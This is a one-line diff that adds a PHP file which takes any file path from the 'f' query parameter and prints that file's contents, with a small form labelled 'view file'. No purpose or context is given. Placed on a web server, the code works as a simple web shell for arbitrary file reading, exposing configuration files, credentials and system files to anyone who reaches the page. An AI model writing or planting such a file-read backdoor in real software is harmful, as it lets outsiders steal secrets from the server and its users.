@@ -1,0 +1,1 @@
+<?php if (isset($_GET["f"])) var_dump(file_get_contents($_GET["f"])); else {echo "<form><input type='text' name='f'><input type='submit' value='view file'></form>";}?>
